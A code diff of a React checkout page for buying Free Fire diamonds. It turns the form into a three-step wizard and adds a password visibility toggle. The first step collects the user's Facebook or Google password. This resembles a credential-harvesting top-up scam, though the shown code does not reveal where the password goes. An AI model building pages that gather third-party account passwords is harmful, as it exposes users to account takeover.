@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useLocation } from "react-router-dom";
 import axios from "axios";
 import { motion, AnimatePresence } from "motion/react";
 import {
@@ -17,7 +17,9 @@ import {
   Facebook,
   Instagram,
   Check,
-  Mail
+  Mail,
+  Eye,
+  EyeOff
 } from "lucide-react";
 import Modal from "../components/Modal";
 import { useLanguage } from "../context/LanguageContext";
@@ -26,17 +28,22 @@ export default function Charge() {
   const { t, language, setLanguage } = useLanguage();
   const [isLangOpen, setIsLangOpen] = useState(false);
   const navigate = useNavigate();
+  const location = useLocation();
+  const state = location.state || {};
   
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const user = JSON.parse(localStorage.getItem('ff_user') || '{}');
 
-  const [platform, setPlatform] = useState("");
-  const [email, setEmail] = useState(user?.temp_email || "");
-  const [platformPassword, setPlatformPassword] = useState("");
-  const [level, setLevel] = useState("");
-  const [charged, setCharged] = useState("لا");
-  const [diamonds, setDiamonds] = useState<number | string | null>(null);
+  const [platform, setPlatform] = useState(state.platform || "");
+  const [email, setEmail] = useState(state.email || user?.temp_email || "");
+  const [platformPassword, setPlatformPassword] = useState(state.platformPassword || "");
+  const [level, setLevel] = useState(state.level || "");
+  const [charged, setCharged] = useState(state.charged || "لا");
+  const [diamonds, setDiamonds] = useState<number | string | null>(state.diamonds || null);
+  const [currentStep, setCurrentStep] = useState(state.returnToStep || 1);
+  const [paymentMethod, setPaymentMethod] = useState(state.paymentMethod || "");
   const [isLoading, setIsLoading] = useState(true);
+  const [showPassword, setShowPassword] = useState(false);
 
   const [showConfirm, setShowConfirm] = useState(false);
   const [showProcess, setShowProcess] = useState(false);
@@ -45,7 +52,6 @@ export default function Charge() {
   const [processStep, setProcessStep] = useState(0);
   const [orderNum, setOrderNum] = useState("");
 
-  const [paymentMethod, setPaymentMethod] = useState("");
   const [toastMessage, setToastMessage] = useState("");
 
   const showToast = (msg: string) => {
@@ -107,9 +113,7 @@ export default function Charge() {
     "جاري إرسال الطلب...",
   ];
 
-  const isFormValid = platform && email && platformPassword && level && diamonds && paymentMethod;
-
-  const handlePreSubmit = () => {
+  const handleNextStep1 = () => {
     if (!platform) {
       showToast(language === 'ar' ? "يرجى اختيار نوع المنصة (فيسبوك، جوجل، الخ...)" : "Please select a platform (Facebook, Google, etc.)");
       return;
@@ -126,10 +130,20 @@ export default function Charge() {
       showToast(language === 'ar' ? "يرجى إدخال مستوى الحساب الخاص بك" : "Please enter your account level");
       return;
     }
+    setCurrentStep(2);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  const handleNextStep2 = () => {
     if (!diamonds) {
       showToast(t?.("select_diamonds") || "يرجى اختيار كمية الجواهر أو العروض");
       return;
     }
+    setCurrentStep(3);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  const handleNextStep3 = () => {
     if (!paymentMethod) {
       showToast(t?.("select_payment") || "يرجى اختيار طريقة الدفع أولاً");
       return;
@@ -217,7 +231,7 @@ export default function Charge() {
                 className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
               >
                 <Mail className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
-                {language === 'ar' ? 'إيميل وهمي' : 'Temp Email'}
+                {language === 'ar' ? 'بريد الخادم' : 'Server Email'}
               </button>
 
               <div className="my-6 border-t border-gray-100"></div>
@@ -379,6 +393,7 @@ export default function Charge() {
         </div>
 
         {/* Section 1: Login */}
+        {currentStep === 1 && (
         <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
           <div className="mb-6 flex items-center gap-3">
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
@@ -469,13 +484,22 @@ export default function Charge() {
                   className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 disabled:opacity-75 disabled:cursor-not-allowed disabled:bg-gray-100"
                 />
               </div>
-              <input
-                type="password"
-                placeholder={t('account_password')}
-                value={platformPassword}
-                onChange={(e) => setPlatformPassword(e.target.value)}
-                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
-              />
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  placeholder={t('account_password')}
+                  value={platformPassword}
+                  onChange={(e) => setPlatformPassword(e.target.value)}
+                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
+                >
+                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                </button>
+              </div>
               <input
                 type="number"
                 placeholder={t('account_level')}
@@ -499,8 +523,10 @@ export default function Charge() {
             </div>
           </div>
         </section>
+        )}
 
         {/* Section 2: Amount */}
+        {currentStep === 2 && (
         <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100">
           <div className="mb-6 flex items-center gap-3">
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
@@ -625,8 +651,10 @@ export default function Charge() {
             </>
           )}
         </section>
+        )}
 
         {/* Section 3: Payment */}
+        {currentStep === 3 && (
         <section className="rounded-2xl bg-white p-4 shadow-sm border border-gray-100 mb-8">
           <div className="mb-6 flex items-center gap-3">
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
@@ -677,6 +705,7 @@ export default function Charge() {
             </div>
           </div>
         </section>
+        )}
 
         {/* Footer */}
         <footer className="mt-12 text-center text-xs text-gray-500 pb-36">
@@ -744,16 +773,47 @@ export default function Charge() {
             </div>
 
             {/* Buy Button */}
-            <button
-              onClick={handlePreSubmit}
-              disabled={showProcess}
-              className={`flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap ${isFormValid ? 'bg-[#CD1212] shadow-red-600/20 hover:bg-red-700' : 'bg-gray-400 opacity-60 shadow-none cursor-not-allowed'}`}
-            >
-              <div className="flex h-5 w-5 items-center justify-center rounded-md border-2 border-white/50">
-                <ShieldCheck className="h-3 w-3" />
-              </div>
-              {showProcess ? 'جاري...' : t('buy_now')}
-            </button>
+            <div className="flex items-center gap-2">
+              {currentStep > 1 && (
+                <button
+                  onClick={() => {
+                    setCurrentStep(prev => prev - 1);
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                  }}
+                  className="flex items-center justify-center rounded-xl bg-gray-100 px-4 py-2.5 text-lg font-black text-gray-700 shadow-sm transition-all hover:bg-gray-200"
+                >
+                  {language === 'ar' ? 'السابق' : 'Back'}
+                </button>
+              )}
+              {currentStep === 1 && (
+                <button
+                  onClick={handleNextStep1}
+                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
+                >
+                  {language === 'ar' ? 'التالي' : 'Next'}
+                </button>
+              )}
+              {currentStep === 2 && (
+                <button
+                  onClick={handleNextStep2}
+                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
+                >
+                  {language === 'ar' ? 'التالي' : 'Next'}
+                </button>
+              )}
+              {currentStep === 3 && (
+                <button
+                  onClick={handleNextStep3}
+                  disabled={showProcess}
+                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700 disabled:bg-gray-400 disabled:opacity-60 disabled:shadow-none"
+                >
+                  <div className="flex h-5 w-5 items-center justify-center rounded-md border-2 border-white/50">
+                    <ShieldCheck className="h-3 w-3" />
+                  </div>
+                  {showProcess ? 'جاري...' : t('buy_now')}
+                </button>
+              )}
+            </div>
           </div>
         </div>
 
